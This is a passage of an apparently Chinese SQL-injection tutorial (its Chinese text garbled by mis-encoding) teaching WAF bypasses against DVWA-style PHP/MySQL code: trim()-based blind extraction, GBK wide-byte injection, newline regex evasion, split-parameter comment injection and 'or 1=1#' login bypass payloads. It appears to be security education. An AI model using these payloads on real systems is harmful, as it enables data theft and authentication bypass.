<p><code>trailing</code>: åªä»<strong>ç»“å°¾</strong>ç§»é™¤</p>
</li>
<li>
<p><code>both</code>: ä»<strong>å¼€å¤´å’Œç»“å°¾ä¸¤ç«¯</strong>ç§»é™¤ï¼ˆé»˜è®¤ï¼‰</p>
</li>
</ul>
</li>
</ul>
<p><strong><mark>ä½†å¦‚æœæˆ‘ä»¬è®©å®ƒç§»é™¤ä¸€ä¸ªä¸å­˜åœ¨çš„å­—ç¬¦ï¼Œä»–ä»€ä¹ˆéƒ½ä¸ä¼šåšï¼š</mark></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;e&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#98c379">&#39;abcd&#39;</span>)
</span></span></code></pre></div><p><strong>è¿”å›çš„ç»“æœä»ç„¶æ˜¯abcdï¼Œå› ä¸ºabcdçš„å¼€å¤´ä¸æ˜¯e</strong></p>
<p><strong>åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸ç›´æ¥æ¯”è¾ƒå­—ç¬¦æ˜¯å¦ç›¸ç­‰ï¼Œè€Œæ˜¯é€šè¿‡æ¯”è¾ƒä¸¤æ¬¡<code>trim()</code>æ“ä½œçš„ç»“æœæ˜¯å¦ç›¸åŒï¼Œæ¥æ¨æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯ç›®æ ‡å­—ç¬¦ä¸²çš„å¼€å¤´</strong></p>
<p><strong>ç¬¬ä¸€æ¬¡<code>trim()</code>ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>(<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;a&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()) <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;b&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()))
</span></span></code></pre></div><p>å‰è€…è¿”å› <code>'dvwa'</code> ï¼ˆå¼€å¤´ä¸æ˜¯&rsquo;a&rsquo;ï¼‰,åè€…è¿”å› <code>'dvwa'</code> ï¼ˆå¼€å¤´ä¹Ÿä¸æ˜¯&rsquo;b&rsquo;ï¼‰æœ€ç»ˆ <code>'dvwa' = 'dvwa'</code>ï¼Œè¡¨è¾¾å¼ä¸ºçœŸ</p>
<p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½åˆ¤æ–­æ•°æ®åº“åç§°ä¸æ˜¯ä»¥aæˆ–è€…bå¼€å¤´ï¼Œè·³è¿‡è¿™ä¸¤ä¸ªå­—æ¯ï¼Œç»§ç»­å¾€ä¸‹å°è¯•</p>
<p><strong>ç¬¬äºŒæ¬¡<code>trim()</code>ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>(<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;c&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()) <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;d&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()))
</span></span></code></pre></div><p>å‰è€…è¿”å› <code>'dvwa'</code> ï¼ˆå¼€å¤´ä¸æ˜¯&rsquo;c&rsquo;ï¼‰,åè€…è¿”å› <code>'vwa'</code> ï¼ˆå¼€å¤´æ˜¯&rsquo;d&rsquo;ï¼‰æœ€ç»ˆ <code>'dvwa' = 'vwa'</code>ï¼Œè¡¨è¾¾å¼ä¸ºå‡</p>
<p>æˆ‘ä»¬å°±èƒ½å¤Ÿåˆ¤æ–­ï¼Œæ•°æ®åº“åç§°æ˜¯ä»¥cå’Œdå…¶ä¸­çš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œå–å…¶ä¸­ä¸€ä¸ªå­—æ¯ï¼Œç»§ç»­å¾€ä¸‹å°è¯•</p>
<p><strong>ç¬¬ä¸‰æ¬¡<code>trim()</code>ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>(<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;d&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()) <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">trim</span>(<span style="color:#e06c75">leading</span> <span style="color:#98c379">&#39;e&#39;</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">database</span>()))
</span></span></code></pre></div><p>è¡¨è¾¾å¼ä¸º<code>'vwa' = 'dvwa'</code>ï¼Œè¡¨è¾¾å¼ä¸ºå‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šï¼Œæ•°æ®åº“åç§°æ˜¯ä»¥då’Œeå…¶ä¸­çš„ä¸€ä¸ªå­—æ¯å¼€å¤´</p>
<p>å†ç»“åˆä¸Šä¸€æ¬¡çš„åˆ¤æ–­ç»“æœï¼Œcå’Œdä¸­æœ‰ä¸€ä¸ªæ˜¯å¼€å¤´å­—æ¯ï¼Œå°±èƒ½ç¡®å®šæ˜¯ä»¥då¼€å¤´äº†</p>
<p>å¦‚æœè¿™ä¸ªè¡¨è¾¾å¼ä¸ºå‡ï¼Œè¯´æ˜då’Œeéƒ½ä¸æ˜¯ï¼Œè€Œcå’Œdä¸­æœ‰ä¸€ä¸ªæ˜¯ï¼Œæˆ‘ä»¬åŒæ ·èƒ½ä»¥æ­¤ç¡®å®šæ˜¯ä»¥cå¼€å¤´</p>
<p>è¿™æ ·ä¸€ä½ä¸€ä½åˆ¤æ–­ï¼Œå°±èƒ½å‡‘å‡ºå…¨è²Œ</p>
<h2 id="7-å®½å­—èŠ‚ç»•è¿‡">#7 å®½å­—èŠ‚ç»•è¿‡
</h2><h3 id="æ³¨å…¥åŸç†">æ³¨å…¥åŸç†
</h3><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯ä¸€ç§ä¸“é—¨é’ˆå¯¹Webåº”ç”¨ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´<strong>å­—ç¬¦é›†ç¼–ç ä¸ä¸€è‡´</strong>è€Œäº§ç”Ÿçš„SQLæ³¨å…¥æ¼æ´</p>
<p>å…¶æ ¸å¿ƒåŸç†æ˜¯PHPè½¬ä¹‰å‡½æ•°çš„å•å­—èŠ‚å’ŒMySQLæ•°æ®åº“ï¼ˆå½“ä½¿ç”¨GBKç­‰å®½å­—èŠ‚ç¼–ç æ—¶ï¼‰çš„å¤šå­—èŠ‚ä¹‹é—´çš„çŸ›ç›¾</p>
<p><strong>Webåº”ç”¨å±‚ï¼ˆå¦‚PHPï¼‰</strong>ï¼šWAFåœ¨å·¥ä½œæ—¶ï¼Œå¹¶ä¸å…³å¿ƒå­—ç¬¦çš„å®é™…ç¼–ç  ã€‚å®ƒåªæ˜¯ç®€å•åœ°å°†å®ƒè®¤ä¸ºæ˜¯å±é™©çš„å•å­—èŠ‚å­—ç¬¦ï¼ˆå¦‚å•å¼•å·<code>'</code>ï¼Œå…¶åå…­è¿›åˆ¶ä¸º<code>0x27</code>ï¼‰ï¼Œå¹¶å‰é¢åŠ ä¸Šä¸€ä¸ªåæ–œæ <code>\</code>è¿›è¡Œè½¬ä¹‰ï¼ˆåå…­è¿›åˆ¶ä¸º<code>0x5c</code>ï¼‰ï¼Œè®©è¿™ä¸ªå±é™©çš„å­—ç¬¦å¤±å»åŸæœ¬çš„åŠŸèƒ½ï¼Œè¢«å½“æˆæ™®é€šçš„å­—ç¬¦è¿›è¡ŒæŸ¥è¯¢</p>
<p><strong>æ•°æ®åº“å±‚ï¼ˆå¦‚MySQLï¼‰</strong>ï¼šå½“æ•°æ®åº“è¿æ¥çš„å­—ç¬¦é›†è¢«è®¾ç½®ä¸ºGBKè¿™ç±»å®½å­—èŠ‚ç¼–ç æ—¶ï¼Œå®ƒä¼šå°è¯•å°†ä¸¤ä¸ªè¿ç»­çš„å­—èŠ‚è§£æä¸ºä¸€ä¸ªæ±‰å­—æˆ–å…¶ä»–å®½å­—ç¬¦</p>
<p>åœ¨GBKç¼–ç ä¸­ï¼Œä¸€ä¸ªå®½å­—èŠ‚çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„èŒƒå›´æ˜¯<code>0x81-0xFE</code> ã€‚å½“MySQLé‡åˆ°è¿™ä¸ªèŒƒå›´å†…çš„å­—èŠ‚æ—¶ï¼Œå®ƒä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå®½å­—ç¬¦çš„å¼€å§‹ï¼Œå¹¶æŠŠç´§éšå…¶åçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ä¹Ÿä¸€å¹¶â€œåƒæ‰â€ï¼Œä½œä¸ºè¯¥å­—ç¬¦çš„ç¬¬äºŒéƒ¨åˆ†</p>
<p><strong>æ”»å‡»è€…æ­£æ˜¯åˆ©ç”¨äº†MySQLçš„è¿™ä¸ªç‰¹æ€§ï¼Œæ„é€ ä¸€ä¸ªç¬¬ä¸€ä¸ªå­—èŠ‚åœ¨<code>0x81-0xFE</code>èŒƒå›´å†…ã€è€Œç¬¬äºŒä¸ªå­—èŠ‚æ°å¥½æ˜¯<code>0x5c</code>ï¼ˆå³åæ–œæ <code>\</code>ï¼‰çš„å­—ç¬¦ï¼Œè®©MySQLæŠŠPHPè¾›è‹¦åŠ ä¸Šå»çš„åæ–œæ å½“ä½œæ™®é€šå­—ç¬¦â€œåƒæ‰â€ï¼Œä»è€Œä½¿å•å¼•å·<code>'</code>é‡æ–°å˜æœ‰æ•ˆï¼Œå¯¼è‡´æ³¨å…¥æˆåŠŸ</strong></p>
<h3 id="æ³¨å…¥è¿‡ç¨‹">æ³¨å…¥è¿‡ç¨‹
</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">mysql_query</span>(<span style="color:#98c379">&#34;SET NAMES gbk&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$id</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">check_addslashes</span>(<span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;SELECT * FROM users WHERE id=&#39;</span><span style="color:#98c379">$id</span><span style="color:#98c379">&#39; LIMIT 0,1&#34;</span>;
</span></span></code></pre></div><p>è¿™æ®µä»£ç çš„å…³é”®ç‚¹åœ¨äºï¼Œå®ƒ<strong>ä½¿ç”¨<code>SET NAMES gbk</code>å°†æ•°æ®åº“è¿æ¥è®¾ç½®ä¸ºGBKç¼–ç </strong>ï¼ŒåŒæ—¶<strong>åˆä½¿ç”¨äº†è‡ªå®šä¹‰çš„<code>check_addslashes</code>å‡½æ•°å¯¹è¾“å…¥è¿›è¡Œè½¬ä¹‰</strong></p>
<ul>
<li>
<p><mark><strong>æ™®é€šæ³¨å…¥(1&rsquo;#)ï¼š</strong></mark></p>
<p>æ”»å‡»è€…æäº¤<code>?id=1'#</code>ï¼Œ<code>check_addslashes</code>å‡½æ•°å°†<code>'</code>è½¬ä¹‰ä¸º<code>\'</code> ï¼Œmysqlæœ€åæ‰§è¡Œçš„è¯­å¥æ˜¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">id</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;1\&#39;</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
</span></span></span></code></pre></div><p>è¿™é‡Œçš„è½¬ä¹‰åçš„<code>'</code>å˜æˆäº†æ™®é€šçš„ç¬¦å·ï¼Œæ— æ³•é—­åˆå­—ç¬¦ä¸²</p>
</li>
<li>
<p><mark><strong>å®½å­—èŠ‚æ³¨å…¥(1%df&rsquo;#)ï¼š</strong></mark></p>
<p>æ”»å‡»è€…æäº¤<code>?id=1%df'#</code>ï¼Œ<code>check_addslashes</code>å‡½æ•°å°†<code>'</code>è½¬ä¹‰ä¸º<code>\'</code>ï¼Œåœ¨urlç¼–ç ä¸‹å˜æˆï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>?id=1%df%5c%27#
</span></span></code></pre></div><p><code>%5c</code>å°±æ˜¯è¢«æ·»åŠ è¿›å»çš„åæ–œæ <code>\</code></p>
<p>è¯·æ±‚åˆ°è¾¾MySQLæœåŠ¡å™¨ï¼Œç”±äºè¿æ¥æ˜¯GBKç¼–ç ï¼ŒMySQLå¼€å§‹æŒ‰ç…§GBKè§„åˆ™è§£æå­—èŠ‚æµ<code>0xdf 0x5c 0x27</code>ï¼š</p>
<p><strong>MySQLé¦–å…ˆè¯»åˆ°<code>0xdf</code>ï¼Œå› ä¸ºå®ƒåœ¨<code>0x81-0xFE</code>èŒƒå›´å†…ï¼ŒMySQLè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå®½å­—ç¬¦çš„å¼€å§‹</strong></p>
<p><strong>éšåï¼ŒMySQLâ€œåƒæ‰â€äº†ç´§éšå…¶åçš„<code>0x5c</code>ï¼ˆåæ–œæ <code>\</code>ï¼‰ä½œä¸ºè¿™ä¸ªå®½å­—ç¬¦çš„ç¬¬äºŒå­—èŠ‚</strong></p>
<p><strong><code>0xdf5c</code>è¢«ç»„åˆæˆäº†ä¸€ä¸ªå®½å­—ç¬¦ï¼ˆåœ¨GBKä¸­ä¸ºâ€œé‹â€ï¼‰ï¼Œæ­¤æ—¶ï¼Œç”¨äºè½¬ä¹‰çš„åæ–œæ <code>\</code>å·²ç»è¢«æ¶ˆè€—æ‰äº†</strong></p>
<p>MySQLç»§ç»­å‘åè§£æï¼Œé‡åˆ°äº†<code>0x27</code>ï¼ˆå•å¼•å·<code>'</code>ï¼‰è¿™ä¸ªå•å¼•å·å‰é¢å·²ç»æ²¡æœ‰äº†åæ–œæ ï¼Œå®ƒå˜æˆäº†ä¸€ä¸ªæœ‰æ•ˆçš„SQLè¯­æ³•ç¬¦å·</p>
<p>æœ€ç»ˆï¼ŒMySQLå®é™…æ‰§è¡Œçš„è¯­å¥å˜æˆäº†ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">id</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;1é‹&#39;&#39; #
</span></span></span></code></pre></div></li>
</ul>
<h2 id="8-æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡">#8 æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡
</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæ­£åˆ™è¡¨è¾¾å¼é‡Œæœ‰å¾ˆå¤šçš„ä¿®æ­£ç¬¦ï¼Œåªæœ‰è®¾ç½®é€‚å½“ï¼Œæ‰èƒ½è¿‡æ»¤åˆ°ç›®æ ‡çš„å­—ç¬¦ä¸²</p>
<p>æœ‰äº›ç²—å¿ƒçš„WAFæ²¡æœ‰è®¾ç½®å¥½ä¿®æ­£ç¬¦ï¼Œè¿™å°±è®©æˆ‘ä»¬æœ‰æœºå¯ä¹˜ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$pattern</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;/select.*from/i&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">preg_match</span>(<span style="color:#e06c75">$pattern</span>, <span style="color:#e06c75">$id</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">die</span>(<span style="color:#98c379">&#39;æ£€æµ‹åˆ°æ”»å‡»ï¼Œè„šæœ¬ç»ˆæ­¢ï¼(Attack Detected!)&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
</span></span></code></pre></div><p>åœ¨è¿™é‡Œçš„è¿‡æ»¤ä¸­ï¼ŒWAFä½¿ç”¨äº†<code>i</code>ä¿®æ­£ç¬¦åŒ¹é…æ­£åˆ™<code>select.*from</code>ï¼Œæ„å‘³ç€å¤§å°å†™ç»•è¿‡æ— æ•ˆ</p>
<p>ç„¶è€Œï¼Œä»–å¿˜è®°äº†ä½¿ç”¨<code>s</code>ä¿®æ­£ç¬¦ï¼</p>
<p>å…ƒå­—ç¬¦<code>.</code>å¯ä»¥åŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œæ²¡æœ‰ä½¿ç”¨<code>s</code>ä¿®æ­£ç¬¦ï¼Œæ‰€ä»¥ <code>.</code> æ— æ³•åŒ¹é…æ¢è¡Œç¬¦ï¼</p>
<p>è€Œå¯¹äºMySQLæ¥è¯´ï¼Œæ¢è¡Œç¬¦å’Œç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ä¸€æ ·ï¼Œéƒ½æ˜¯åˆæ³•çš„ç©ºç™½åˆ†éš”ç¬¦</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æŸ¥è¯¢è¯­å¥é‡Œé¢æ’å…¥æ¢è¡Œç¬¦ç»•è¿‡ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&#39;dvwa&#39; #
</span></span><span style="display:flex;"><span>												 â†‘
</span></span></code></pre></div><h2 id="9-å¤šå‚æ•°è¯·æ±‚ç»•è¿‡åŒè¾“å…¥è¡¨å•">#9 å¤šå‚æ•°è¯·æ±‚ç»•è¿‡ï¼ˆåŒè¾“å…¥è¡¨å•ï¼‰
</h2><h3 id="ç»•è¿‡é—´éš”ä»£ç ">ç»•è¿‡é—´éš”ä»£ç 
</h3><p>éƒ¨åˆ†è¡¨å•ï¼ˆæ¯”å¦‚ç™»å½•ç•Œé¢ï¼‰æ˜¯é€šè¿‡æ‹¼å‡‘ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¥è¿›è¡ŒæŸ¥è¯¢çš„ï¼Œæ¯”å¦‚ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;a&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;b&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM user WHERE name = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND password = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
</span></span></code></pre></div><p>WAFå¯èƒ½å¯¹å•ä¸ªçš„å†…å®¹åšäº†è¿‡æ»¤ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æŠŠæ³¨å…¥è¯­å¥æ‹†åˆ†</p>
<p>aéƒ¨åˆ†è¾“å…¥ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union/*
</span></span></code></pre></div><p>béƒ¨åˆ†è¾“å…¥ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>*/select 1,2#
</span></span></code></pre></div><p>è¿™æ ·æ‹¼å‡‘ä¹‹åçš„sqlè¯­å¥å°±æ˜¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">union</span><span style="color:#7f848e">/*&#39; AND password = &#39;*/</span><span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">2</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span></span></code></pre></div><p>æˆ‘ä»¬å°±æŠŠä¸­é—´bçš„éƒ¨åˆ†æ³¨é‡Šæ‰äº†ï¼Œå¹¶ä¸”ç»•è¿‡äº†WAFï¼ŒæˆåŠŸæ³¨å…¥äº†æŸ¥è¯¢è¯­å¥</p>
<h3 id="ä¸‡èƒ½å¯†ç ">ä¸‡èƒ½å¯†ç 
</h3><p><strong>è¿˜å¯ä»¥æ„é€ å‡ºä¸‡èƒ½å¯†ç </strong></p>
<p>æˆ‘ä»¬ä½¿ç”¨ç®¡ç†å‘˜çš„è´¦å·ç™»å½•ï¼Œå‡è®¾æ˜¯adminï¼Œå¯†ç è¾“å…¥ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39;or 1=1# 
</span></span></code></pre></div><p>è¿™æ ·sqlè¯­å¥å°±å˜æˆäº†ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin &#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;&#39;</span><span style="color:#c678dd">or</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39;
</span></span></span></code></pre></div><p><strong>æˆ‘ä»¬ç«Ÿç„¶ç›´æ¥ç™»å½•äº†ç®¡ç†å‘˜çš„è´¦å·ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</strong></p>
<p>ä¸€èˆ¬æ²¡æœ‰è¿›è¡ŒSQLè¯­å¥å‚æ•°åŒ–çš„ç™»å½•è¯­å¥æ˜¯è¿™æ ·çš„ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;xxx&#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;xxx&#39;</span>
</span></span></code></pre></div><p>æ•°æ®åº“ç®¡ç†ç³»ç»ŸDBMSä¼šåˆ¤æ–­è¿”å›çš„è¡Œæ•°ï¼Œå¦‚æœæœ‰è¿”å›è¡Œï¼Œè¯æ˜è´¦å·å’Œå¯†ç æ˜¯æ­£ç¡®çš„ï¼Œå³ç™»å½•æˆåŠŸ</p>
<p>è€Œåœ¨æˆ‘ä»¬è¾“å…¥ä¸‡èƒ½å¯†ç åï¼Œsqlè¯­å¥å˜æˆäº†ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">Select</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">From</span> ç”¨æˆ·è¡¨ <span style="color:#c678dd">Where</span> <span style="color:#e06c75">UserName</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">xxx</span> <span style="color:#c678dd">and</span> <span style="color:#e06c75">Password</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;&#39;</span> <span style="color:#c678dd">or</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;&#39;</span>
</span></span></code></pre></div><p>oræ˜¯æˆ–è€…çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯Password=xxxçš„æ—¶å€™å¯ä»¥ç™»å½•ï¼Œä¹Ÿå¯ä»¥æ˜¯1=1çš„æ—¶å€™å¯ä»¥ç™»å½•</p>
<p>ä½†1æ°¸è¿œç­‰äº1ï¼Œæ‰€ä»¥ç™»å½•æ¡ä»¶æ°¸è¿œæˆç«‹ï¼</p>
<p>æˆ–è€…æ¢ä¸€ç§æ–¹å¼ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨è´¦å·å¤„å°±ä½¿ç”¨ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>admin&#39;# 
</span></span></code></pre></div><p>å¯†ç éšä¾¿å¡«å†™ï¼Œè¿™æ ·sqlè¯­å¥å°±æ˜¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin&#39;</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39; AND password = &#39;</span><span style="color:#e06c75">xxx</span><span style="color:#98c379">&#39;
</span></span></span></code></pre></div><p>å®Œå…¨å¿½ç•¥äº†å¯†ç çš„æ ¡éªŒï¼Œä¹Ÿå°±é¡ºåˆ©ç™»å½•äº†ç®¡ç†å‘˜è´¦å·</p>
<p><span style="color:#2c8af0;font-size:20px"><strong>æ­å–œï¼Œä½ ç°åœ¨å·²ç»å­¦ä¼šäº†æ‰‹å·¥æ³¨å…¥ï¼</strong></span></p>
